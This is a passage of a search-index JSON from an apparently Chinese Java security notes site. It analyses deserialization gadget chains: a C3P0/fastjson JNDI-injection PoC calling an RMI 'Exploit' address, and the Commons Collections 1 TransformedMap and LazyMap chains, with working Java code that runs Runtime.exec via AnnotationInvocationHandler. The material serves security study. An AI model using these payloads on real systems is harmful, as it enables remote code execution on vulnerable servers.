exp.setJndiName(\"rmi://127.0.0.1:10099/exp\"); exp.setLoginTimeout(1); } } fastjson exp: String poc = \"{\\\"object\\\":[\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\",{\\\"jndiName\\\":\\\"rmi://localhost:8088/Exploit\\\", \\\"loginTimeout\\\":0}]}\"","title":"POC"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/#_4","text":"\u5728fastjson\uff0cjackson\u7b49\u73af\u5883\u4e0b\uff0c\u8c03\u7528JndiRefConnectionPoolDataSource\u7c7b\u7684jndiname\uff0clogintimeout\u5c5e\u6027setter\u65b9\u6cd5\uff0c\u5411jndiname\u4f20\u5165\u6076\u610fRMI\u670d\u52a1\u5668\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528logintimeout\u7684setter\u65b9\u6cd5\u4f7f\u53d7\u5bb3\u673a\u53bblookup\u8bbe\u7f6e\u597d\u7684jndiname\u4e2d\u7684\u6076\u610f\u5730\u5740\uff0c\u9020\u6210JNDI\u6ce8\u5165\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/CC%E9%93%BE%E5%88%86%E6%9E%90/","text":"CC\u94fe\u5206\u6790 Apache-Commons-Collections 1 Apache-Commons-Collections 2 Apache-Commons-Collections 3 Apache-Commons-Collections 4 Apache-Commons-Collections 5 Apache-Commons-Collections 6 Apache-Commons-Collections 7 \u4e00\u4e9btrick reference: https://clq0.top/commons_collections_analysis/ http://wjlshare.com/archives/1535 https://xz.aliyun.com/t/9409#toc-7 https://paper.seebug.org/1242/#commons-collections-7","title":"CC\u94fe\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/CC%E9%93%BE%E5%88%86%E6%9E%90/#cc","text":"Apache-Commons-Collections 1 Apache-Commons-Collections 2 Apache-Commons-Collections 3 Apache-Commons-Collections 4 Apache-Commons-Collections 5 Apache-Commons-Collections 6 Apache-Commons-Collections 7 \u4e00\u4e9btrick reference: https://clq0.top/commons_collections_analysis/ http://wjlshare.com/archives/1535 https://xz.aliyun.com/t/9409#toc-7 https://paper.seebug.org/1242/#commons-collections-7","title":"CC\u94fe\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%201/Apache-Commons-Collections%201/","text":"Apache-Commons-Collections 1 \u76ee\u5f55 \u7248\u672c \u73af\u5883 Transformer Map \u94fe RCE\u539f\u7406 TransformerMap\u7c7b Transformer\u7c7b ConstantTransformer InvokerTransformer ChainedTransformer \u89e6\u53d1 \u603b\u7ed3 LazyMap\u94fe RCE\u539f\u7406 \u89e6\u53d1 \u603b\u7ed3 title: Apache-Commons-Collections1 \u53cd\u5e8f\u5217\u5316\u5206\u6790 date: tags: java\u5f00\u53d1\u4e0e\u5b89\u5168 \u7248\u672c CommonsCollections 3.1 - 3.2.1 JDK\u7248\u672c\uff1a1.7\uff088u71\u4e4b\u540e\u5df2\u4fee\u590d\u4e0d\u53ef\u5229\u7528\uff09 \u73af\u5883 <dependency> <groupId>commons-collections</groupId> <artifactId>commons-collections</artifactId> <version>3.2</version> </dependency> Transformer Map \u94fe RCE\u539f\u7406 \u6211\u5728\u7f51\u4e0a\u627e\u5230\u4e86\u4e00\u5219\u5229\u7528\u4ee3\u7801\uff0c\u867d\u7136\u8fd9\u4e2a\u5229\u7528\u4ee3\u7801\u5f88\u7c97\u6d45\uff0c\u5e76\u6ca1\u6709CC\u94fe1\u7684\u89e6\u53d1\u8fc7\u7a0b\uff0c\u4f46\u662f\u5bf9\u4e8e\u8fd9\u6761\u94fe\u7684\u539f\u7406\u8fd8\u662f\u53ef\u89c1\u4e00\u6591\u7684\u3002 import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[] {\"calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } } TransformerMap\u7c7b TransformerMap\u7c7b\u662f\u9020\u6210\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u539f\u56e0\u4e4b\u4e00 TransformerMap\u662fapacheCommonsCollections\u91cc\u63d0\u4f9b\u7684\u4e00\u4e2a\u6570\u636e\u7c7b\u578b\u3002\u5b83\u53ef\u4ee5\u4fee\u9970\u4e00\u4e2aMap\u7c7b\u578b\u7684\u5bf9\u8c61\u3002\u5f53\u4fee\u9970\u8fc7\u7684Map\u6dfb\u52a0\u65b0\u5143\u7d20\u65f6\uff0c\u5b83\u4f1a\u8c03\u7528\u5728decorate\u91cc\u58f0\u660e\u597d\u7684Trasnformer\u7c7b\u7684transform\u65b9\u6cd5\u5e76\u4f20\u5165\u65b0\u6dfb\u7684\u952e\u540d\u6216\u503c\u540d\u3002 Map DecoratedMap = TransformedMap.decorate\uff08Map,keyTransformer,valueTransformer\uff09 keyTransformer\u548cvalueTransformer\u5206\u522b\u6307\u5411\u4e0d\u540c\u7684Transformer\u7c7b\u3002 Transformer\u7c7b \u6211\u4eec\u770b\u4e00\u4e0bTransformer\u7c7b \u53ef\u4ee5\u53d1\u73b0\u5b83\u53ea\u662f\u4e00\u4e2a\u501f\u53e3\uff0c\u4ed6\u7684\u65b9\u6cd5\u9700\u8981\u5176\u4ed6\u5b50\u7c7b\u5b9e\u73b0\u3002 \u5f53TransformerMap\u5728\u65b0\u6dfb\u5143\u7d20\u65f6\u5c31\u4f1a\u8c03\u7528decorate\u91cc\u8bbe\u5b9a\u597d\u7684Transformer\u7c7b\u7684transform\u65b9\u6cd5\u3002 \u5b83\u7684\u63a5\u53e3\u5b9e\u73b0\u7c7b\u6709\u4ee5\u4e0b\u51e0\u4e2a\u3002 ConstantTransformer \u8fd9\u4e2a\u7c7b\u4e3b\u8981\u7684\u4e24\u4e2a\u65b9\u6cd5\u5c31\u662f\u8fd9\u4fe9\u4e86\u3002 public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } \u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\uff0c\u5c31\u662f\u628a\u4f20\u5165\u7684\u5bf9\u8c61\u539f\u539f\u672c\u672c\u8fd4\u56de\u3002 InvokerTransformer \u4e5f\u662f\u4e24\u4e2a\u91cd\u8981\u65b9\u6cd5 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException var6) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException var7) { throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); } } } \u5c31\u662f\u4f20\u5165\u65b9\u6cd5\u540d\uff0c\u53c2\u6570\u7c7b\u578b\u548c\u53c2\u6570\uff0c\u7136\u540e\u901a\u8fc7\u53cd\u5c04\u6765\u6267\u884c\u8fd9\u4e2a\u65b9\u6cd5 ChainedTransformer \u4e5f\u662f\u4e24\u4e2a\u91cd\u8981\u65b9\u6cd5 public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i < this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } \u5c31\u662f\u628a\u4f20\u5165\u7684\u591a\u4e2aTransfomer\u7c7b\u7684transformer\u65b9\u6cd5\u4f9d\u6b21\u6267\u884c\uff0c\u6bcf\u4e2atransformer\u65b9\u6cd5\u6267\u884c\u540e\u8fd4\u56de\u7684\u5bf9\u8c61\u4f1a\u88ab\u5f53\u505a\u4e0b\u4e00\u6b21\u6267\u884c\u7684\u65f6\u5019\u4f20\u5165\u7684\u53c2\u6570\u3002 \u901a\u8fc7\u4ee5\u4e0a\u4fe1\u606f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6e05\u6670\u7684\u770b\u61c2\u4e0a\u9762\u7684payload\u4e86\u3002 \u5148\u901a\u8fc7ConstantTransformer\u83b7\u5f97 Runtime\u7c7b\uff0c\u518d\u901a\u8fc7InvokerTransformer\u6267\u884cexec\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7ChainedTransformer\u5c06\u4e24\u4e2a\u7c7b\u4e32\u8d77\u6765\uff0c\u8ba9InvokerTransformer\u4ee5ConstantTrasformer\u8fd4\u56de\u7684Runtime\u7c7b\u4e3a\u53c2\u6570\u6267\u884cexec\u65b9\u6cd5\uff0c\u8fbe\u5230RCE\u7684\u76ee\u7684\u3002 \u89e6\u53d1 \u89e6\u53d1\uff0c\u6211\u4eec\u9009\u62e9\u7684\u5730\u65b9\u662fsun.reflect.annotation.AnnotationInvocationHandler\u7684readObject\u65b9\u6cd5\uff08\u6ce8\u610f8u71\u4ee5\u4e0b\u624d\u80fd\u6709\u89e6\u53d1\u70b9\uff0c\u4e4b\u540e\u7684\u7248\u672c\u5df2\u88ab\u4fee\u590d\uff09 \u89e6\u53d1\u70b9\u4ee3\u7801\u3002 \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5b83\u5bf9\u4f20\u5165\u7684map\u7684\u6bcf\u4e00\u4e2avalue\u6267\u884c\u4e86setValue\u3002 \u53ef\u4ee5\u5f88\u660e\u663e\u7684\u53d1\u73b0\u4f1a\u5bf9\u503c\u8fdb\u884ctransform\u65b9\u6cd5\u3002\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8e\u89e6\u53d1\u4e86\u4e00\u6b21Map.put()\u3002\u63a5\u4e0b\u6765\uff0c\u5c31\u662fpayload\u6784\u9020\u65f6\u95f4\u4e86\u3002 \u4f46\u662f AnnotationInvocationHandler \u662f\u5185\u90e8\u7c7b\u65e0\u6cd5\u76f4\u63a5\u5b9e\u4f8b\u5316\uff0c\u4f46\u5b83\u7684\u7236\u7c7bInvocationHandler\u53ef\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u53cd\u5c04\u5f97\u5230 AnnotationInvocationHandler \u6784\u9020\u65b9\u6cd5\uff0c\u7136\u540e\u5bf9\u5176\u4f7f\u7528newInstance\u518d\u5411\u4e0a\u8f6c\u578b\u4e3a\u7236\u7c7b InvocationHandler \u3002\u65e2\u7136\u8981\u83b7\u5f97\u5bf9\u8c61\uff0c\u6211\u4eec\u5c31\u5e94\u8be5\u5173\u6ce8\u4e00\u4e0b\u5b83\u7684\u6784\u9020\u65b9\u6cd5\u3002 AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); } } \u8981\u4f20\u5165\u4e24\u4e2a\u53c2\u6570\uff0cvar2\u4e0d\u7528\u8bf4\u4e86\u5c31\u662f\u6211\u4eec\u4f20\u5165\u7684Map\uff0cvar1\u5462\uff1f\u662fAnnotation\u7c7b\uff0c\u5373\u6240\u6709\u6ce8\u91ca\u7c7b\u7684\u63a5\u53e3\u3002\u6211\u4eec\u5fc5\u987b\u5728\u6b64\u5904\u4f20\u5165\u4e00\u4e2a\u6ce8\u91ca\u7c7b\u624d\u80fd\u4f7fif\u5224\u65ad\u4e3a\u771f\uff0c\u624d\u80fd\u628a\u6211\u4eec\u7684\u53c2\u6570\u4e2d\u7684Map\u4f20\u5165\u3002 \u4f46\u662f\u5e76\u4e0d\u662f\u6240\u6709\u6ce8\u91ca\u7c7b\u4f20\u8fdb\u53bb\u90fd\u6709\u6548\uff0c\u6ce8\u91ca\u7c7b\uff08\u5b9e\u9645\u4e0a\u5c31\u662f\u63a5\u53e3\uff09\u5fc5\u987b\u6709\u5b9a\u4e49\u7684\u65b9\u6cd5\u624d\u80fd\u6b63\u5e38\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u3002\u5173\u4e8e\u6b64\u70b9\u6211\u4eec\u540e\u9762\u518d\u8be6\u7ec6\u8c08\u8c08\u3002 \u56e0\u4e3a\u518dreadObject\u65b9\u6cd5\u91cc\u6211\u4eec\u4f1a\u6267\u884c Map var3 = var2.memberTypes() \uff0c\u6211\u4eec\u770b\u770bmemberTypes\u6e90\u7801\u3002 \u53d1\u73b0\u662f\u8fd4\u56de\u6784\u9020\u65b9\u6cd5\u4e2d\u5b9a\u4e49\u597d\u7684memberTypes\u5c5e\u6027\u3002\u800c\u8fd9\u4e2amemberTypes\u5c5e\u6027\u53c8\u548c\u4e0a\u4e00\u884c\u7684var2\u5c5e\u6027\u6709\u5173\uff0cvar2\u5c5e\u6027\u53c8\u4e0egetDecalredMethods\u6709\u5173\u2026\u56e0\u6b64\u6211\u624d\u731c\u6d4b \u201c\u6ce8\u91ca\u7c7b\u5fc5\u987b\u6709\u5b9a\u4e49\u7684\u65b9\u6cd5\u624d\u80fd\u6b63\u5e38\u89e6\u53d1\u53cd\u5e8f\u5217\u5316 \u201c,\u5b9e\u9645\u7ed3\u679c\u786e\u5b9e\u5982\u6b64\u3002 \u76ee\u524d\u627e\u5230\u7684\u80fd\u591f\u6b63\u5e38\u89e6\u53d1\u6f0f\u6d1e\u7684\u6ce8\u91ca\u7c7b\u6709 Target Retention SuppressWarnings .\u65e0\u4e00\u4f8b\u5916\u4ed6\u4eec\u4f5c\u4e3a\u63a5\u53e3\u90fd\u5b9a\u4e49\u4e86\u65b9\u6cd5\u3002\u800c\u4e14\u5728\u6211\u7ffb\u9605\u4e00\u4e9b\u53c2\u8003\u6587\u6863\u540e\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8fd9\u6837 \u53e6\u5916\u4e00\u70b9\u9700\u8981\u6ce8\u660e\u7684\u662f\uff0cRuntime\u7c7b\u6ca1\u6709\u7ee7\u627fSerialize\u63a5\u53e3\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u4e0d\u80fd\u88ab\u76f4\u63a5\u5e8f\u5217\u5316\u3002 \u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u6211\u4eec\u5728transformer\u94fe\u91cc\u60f3\u76f4\u63a5\u901a\u8fc7\u6709 new ConstantTransformer(Runtime. getRuntime ()) \u6765\u83b7\u53d6Runtime\u5bf9\u8c61\u65f6\uff0c\u4f1a\u53cd\u5e8f\u5217\u5316\u5931\u8d25\u3002 \u4f46\u662fClass\u7c7b\u662f\u6709\u7ee7\u627fSerialize\u63a5\u53e3\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7transformer\u94fe\u548c\u53cd\u5c04\u6765\u5728\u53cd\u5e8f\u5217\u5316\u9636\u6bb5\u9010\u6b65\u521b\u5efaRuntime\u7c7b\uff0c\u7ee7\u800c\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898 \u603b\u7ed3\u4e00\u4e0b\u51e0\u4e2a\u5751\u70b9\uff1a 1.Runtime\u7c7b\u4e0d\u80fd\u88ab\u5e8f\u5217\u5316 \\2. AnnotationInvocationHandler \u65e0\u6cd5\u76f4\u63a5\u5b9e\u4f8b\u5316\uff0c\u53ef\u901a\u8fc7\u53cd\u5c04\u83b7\u5f97\u5bf9\u8c61 3.\u6ce8\u610f\u5728\u5b9e\u4f8b\u5316 AnnotationInvocationHandler \u65f6\u8981\u4f20\u5165\u5b9a\u4e49\u597d\u65b9\u6cd5\u7684\u6ce8\u91ca\u7c7b OK\uff0c\u4ee5\u4e0a\u77e5\u9053\u4e86\u540e\u5c31\u80fd\u8bd5\u7740\u5199\u4e00\u4e0bpayload\u4e86\uff08\u8fd9\u4e2apayload\u4f9d\u65e7\u4e0d\u80fd\u6b63\u5e38\u6267\u884c\uff0c\u9519\u8bef\u51fa\u5904\u95f4\u4ee3\u7801\u6ce8\u91ca\uff0c\u5177\u4f53\u539f\u56e0\u770b\u4e0b\u6587\uff09\u3002 import java.io.*; import java.lang.annotation.*; import java.lang.reflect.*; import java.util.*; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.*; import org.apache.commons.collections.map.TransformedMap; public class test2 { public static void main(String[] args){ try { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{new String(\"getRuntime\"),new Class[0]}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{new String(\"calc.exe\")}), }; ChainedTransformer chain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(\"sc\",\"b\"); //\u4e0d\u80fd\u6267\u884c\u7684\u539f\u56e0\u5728\u8fd9\u91cc\uff0c\u5982\u679c\u662fput(\"value\",\"a\")\u5c31\u53ef\u4ee5\u6b63\u5e38\u6267\u884c Map outmap = TransformedMap.decorate(innermap,null,chain); Class Annotation = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationCons = Annotation.getDeclaredConstructor(Class.class,Map.class); AnnotationCons.setAccessible(true); InvocationHandler InvocationHandler = (InvocationHandler) AnnotationCons.newInstance(Target.class,outmap); ObjectOutputStream a = new ObjectOutputStream(new FileOutputStream(new File(\"a.bin\"))); a.writeObject(InvocationHandler); a.close(); ObjectInputStream b = new ObjectInputStream(new FileInputStream(\"a.bin\")); b.readObject(); b.close(); } catch (Exception e){e.printStackTrace();} } } \u4e3a\u4ec0\u4e48\u4e0d\u80fd\u6267\u884c\uff0c\u8fd9\u539f\u56e0\u4e0e\u4e0a\u9762\u63d0\u5230\u7684\u201c \u6ce8\u610f\u5728\u5b9e\u4f8b\u5316 AnnotationInvocationHandler \u65f6\u8981\u4f20\u5165\u5b9a\u4e49\u597d\u65b9\u6cd5\u7684\u6ce8\u91ca\u7c7b \u201d\u5f88\u6709\u5173\u8054\u3002 \u56e0\u4e3a\u6d89\u53caJVM\u7684\u4e00\u4e9b\u4e1c\u897f\uff0c\u6211\u4eec\u4e0d\u4f1a\u600e\u4e48\u53bb\u6df1\u7a76\uff0c\u5c31\u662f\u6d45\u6d45\u7684\u770b\u4e00\u4e0b\uff0c\u505a\u51fa\u4e00\u4e9b\u63a8\u6d4b\u3002 \u9996\u5148\u6211\u4eec\u5173\u6ce8\u5230 AnnotationInvocationHandler \u7684readObject\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u590d\u6742\u7684\u63a8\u7406\u4e86\uff0c\u5efa\u8bae\u5148\u628a\u5404\u65b9\u6cd5\u7684\u610f\u4e49\u5f04\u660e\u767d \u53d1\u73b0\u5fc5\u987b\u8981var7\uff01=null\u624d\u80fd\u6b63\u5e38\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u90a3\u4e48var7\u7684\u6765\u6e90\u662f\u4ece(Map)var3\u4e2d\u83b7\u5f97\u4ee5(String)var6\u4e3a\u952e\u540d\u7684\u503c\u3002var6\u662fvar3\u4e2d\u4e00\u9879\u7684\u952e\u540d\u3002\u800cvar3\u7684\u6765\u6e90\u662f(Annotation)var2\u7684menberTypes,\u6211\u4eec\u8ddf\u8fdb\u8fd9\u4e2a\u65b9\u6cd5\u3002 \u90a3\u4e48var1\u5c31\u662fAnnotationInvocationHandler\u7684type\u5c5e\u6027\u4e86\uff0c\u800c\u8fd9\u4e2atype\u5c5e\u6027\u5728\u5176\u6784\u9020\u65b9\u6cd5\u4e2d\u5c31\u5b9a\u4e49\u597d\u4e86\uff0c\u662f\u4f20\u5165\u7684\u6ce8\u91ca\u7c7b\u3002 \u4e5f\u5c31\u662f\u8bf4var1\u5c31\u662f\u6211\u4eec\u5728\u5b9e\u4f8b AnnotationInvocationHandler \u65f6\u4f20\u5165\u7684\u6ce8\u91ca\u7c7b\u3002 \u7ed3\u5408\u4ee5\u4e0a\u6d41\u7a0b\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053\u8fd9\u4e2a\u8fc7\u7a0b\u662f: \u4ece \u5b9e\u4f8b AnnotationInvocationHandler \u65f6\u4f20\u5165\u7684\u6ce8\u91ca\u7c7b \u4e2d\u83b7\u53d6\u6700\u540e\u4e00\u4e2a\u65b9\u6cd5\uff0c\u7136\u540e\u628a\u5b83\u7f16\u5165\u4e3a\u4e00\u4e2aHashMap(\u4ee5\u4e0b\u79f0\u4e3a\u6ce8\u91ca\u65b9\u6cd5Map)\u7684\u4e00\u4e2a\u952e\u540d\u5e76\u7ed9\u4e88\u503c\u3002\u5728readObject\u65f6\u4f1a\u904d\u5386\u4f20\u5165\u7684Map\uff0c\u5982\u679c\u5728\u4f20\u5165\u7684Map\u4e2d\u627e\u5230\u4e86\u4e00\u9879\u7684\u952e\u540d\u5728\u6ce8\u91ca\u65b9\u6cd5Map\u4e2d\u5b58\u5728\uff08\u5373 \u5728\u4f20\u5165\u7684Map\u4e2d\u627e\u5230\u4e86\u4e00\u9879\u7684\u952e\u540d\u4e0e\u5b9e\u4f8b\u5316\u65f6\u4f20\u5165\u7684\u6ce8\u91ca\u7c7b\u7684\u6700\u540e\u4e00\u4e2a\u65b9\u6cd5\u540c\u540d\uff09\uff0c\u5219if\u6761\u4ef6\u4e3a\u771f\uff0c\u653b\u51fb\u6210\u529f\u3002 \u6240\u4ee5\u4e0a\u9762\u4e3a\u4ec0\u4e48put(\u201cvalue\u201d,\u4efb\u610f)\u624d\u80fd\u8fbe\u6210\u653b\u51fb\u7684\u539f\u56e0\u662f\uff0c Target Retention SuppressWarnings \u8fd9\u4e09\u4e2a\u6ce8\u91ca\u7c7b\u90fd\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u65b9\u6cd5\u540d\u4e3avalue\u7684\u65b9\u6cd5\u3002 \u5206\u6790\u5b8c\u4e86\u3002\u8fd9\u4e2a\u6d1e\u5229\u7528\u7248\u672c\u53ea\u80fd\u57288u71\u4ee5\u524d\uff0c\u6bd4\u8f83\u53e4\u8001\u65e0\u7528\u3002 \u603b\u7ed3 AnnotationInvocationHandler.readObject \u4f1a\u8c03\u7528\u4f20\u5165\u7684map\u4e2d\u6bcf\u4e00\u4e2avalue\u7684transformer\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7ConstantTrasformer\u548cInvokerTransformer\u7ec4\u5408\u4e3a\u4e00\u4e2aChainedTransformer\u6765\u9010\u6b65\u8fd8\u539fRuntime\u7c7b\u5e76\u8c03\u7528\u5176exec\u65b9\u6cd5\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002 ConstantTransformer.transformer\u662f\u8fd4\u56de\u4f20\u5165\u7684\u7c7b\uff0cInvokerTransformer.transformer\u662f\u901a\u8fc7\u53cd\u5c04\u5bf9\u4f20\u5165\u7684\u65b9\u6cd5\u540d\u53c2\u6570\u540d\u7b49\u8fdb\u884c\u8c03\u7528\uff0cChainedTransformer.transformer\u662f\u5c06\u4f20\u5165\u7684transformer\u65b9\u6cd5\u6309\u987a\u5e8f\u6267\u884c\uff0c\u5e76\u5c06\u4e0a\u4e00\u4e2a\u65b9\u6cd5\u6267\u884c\u7ed3\u679c\u505a\u53c2\u6570\u4f20\u9012\u7ed9\u4e0b\u4e00\u4e2a\u65b9\u6cd5\u3002 \u5728cc4.0\u4e2d\u53ef\u4ee5\u53d1\u73b0TransformedMap\u7684decorate\u65b9\u6cd5\u88ab\u5220\u9664\u4e86\uff0c\u5bfc\u81f4\u8be5\u94fe\u4e0d\u80fd\u987a\u7545\u8fd0\u884c\u3002 jdk8u71 \u4e2d\u7684AnnotationInvocationHandler#readObject\u65b9\u6cd5\u4e2d\u6ca1\u6709memberValue.entrySet\uff0c\u5bfc\u81f4\u94fe\u4e0d\u80fd\u987a\u7545\u8fd0\u884c\u3002 LazyMap\u94fe ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() RCE\u539f\u7406 LazyMap\u7684\u83b7\u5f97\u65b9\u6cd5\u548cTransfromerMap\u5dee\u4e0d\u591a\u3002 Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } \u5728\u5bf9LazyMap\u4f7f\u7528get\u65b9\u6cd5\u65f6\uff0c\u5b83\u4f1a\u6267\u884cthis.factory.transform(key),\u800cthis.factory.transform\u5982\u679c\u53bb\u8ddf\u8fdb\u5206\u6790\u7684\u8bdd\uff0c\u5b9e\u8d28\u4e0a\u5c31\u662f\u8c03\u7528\u6211\u4eec\u5728decorate\u4f20\u8fdb\u53bb\u7684Transformer\u7c7b\u3002 \u89e6\u53d1 LazyMap\u7684\u89e6\u53d1\u70b9\u4e5f\u5728 AnnotationInvocationHandler \u4e2d\uff0c\u4f46\u4e0d\u662f\u5728readObject\u65b9\u6cd5\uff0c\u800c\u662f\u5728invoke\u65b9\u6cd5\u3002invoke\u65b9\u6cd5\u4e2d\u6709\u4e00\u884c Object var6 = this.memberValues.get(var4); \u5176\u4e2dthis.memberVales\u662f\u5728\u6784\u9020\u65b9\u6cd5\u4e2d\u5b9a\u4e49\u4e3a\u4f20\u5165\u7684Map\u3002 \u90a3\u4e48invoke\u65b9\u6cd5\u8981\u600e\u4e48\u624d\u80fd\u89e6\u53d1\u5462\uff1f\u7b54\u6848\u662f\u52a8\u6001\u4ee3\u7406\u3002 \u719f\u6089\u52a8\u6001\u4ee3\u7406\u7684\u670b\u53cb\u80af\u5b9a\u76f4\u5230\uff0cinvoke\u65b9\u6cd5\u662f\u52a8\u6001\u4ee3\u7406\u4e2d\u7684\u4e00\u4e2a\u7279\u6b8a\u7684\u65b9\u6cd5\uff0c\u5728\u4ee3\u7406\u7c7b\u4e2d\u65e0\u8bba\u6267\u884c\u4ec0\u4e48\u65b9\u6cd5\uff0c\u5b9e\u8d28\u4e0a\u90fd\u662f\u5728\u6267\u884cinvoke\u65b9\u6cd5\u3002 \u90a3\u4e48\u63a5\u4e0b\u6765\u5c31\u662f\u9a9a\u601d\u8def\u4e86\uff1a \u6211\u4eec\u901a\u8fc7\u53cd\u5c04\u548c\u5411\u4e0a\u8f6c\u578b\u5f97\u5230\u4e00\u4e2a AnnotationInvocationHandler(Class var1, Map var2) \u5bf9\u8c61\u3002 \u6784\u5efa\u4e00\u4e2aMap\u7684\u4ee3\u7406\u7c7b\uff0c\u5176\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u521a\u521a\u5f97\u5230\u7684 AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u518d\u6545\u6280\u91cd\u65bd\u5c06\u5176\u901a\u8fc7\u5411\u4e0a\u8f6c\u578b\u5f97\u5230\u4e00\u4e2a AnnotationInvocationHandler \u5bf9\u8c61\u3002\u5f53\u8be5\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u6267\u884creadObjct\u65b9\u6cd5\u65f6\uff0c\u4f1a\u6267\u884c\u4ee5\u4e0bentryset\u65b9\u6cd5 \u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u662f\u5bf9\u4e00\u4e2a\u4ee3\u7406\u7c7b\u6267\u884c\u4e86\u4e00\u4e0bentrySet\u65b9\u6cd5\uff0c\u5373\u6267\u884c\u4e86\u4ee3\u7406\u7c7b\u7684invoke\u65b9\u6cd5\uff0c\u53c8\u56e0\u4e3a\u4ee3\u7406\u7c7b\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u586b\u5165\u7684\u662f AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u5176\u5185\u90e8\u5df2\u7ecf\u5199\u597d\u4e86invoke\u65b9\u6cd5\uff0c\u6240\u4ee5\u6b64\u5904\u6267\u884c\u7684\u4ee3\u7406\u7c7b\u7684invoke\u65b9\u6cd5\u5373 AnnotationInvocationHandler 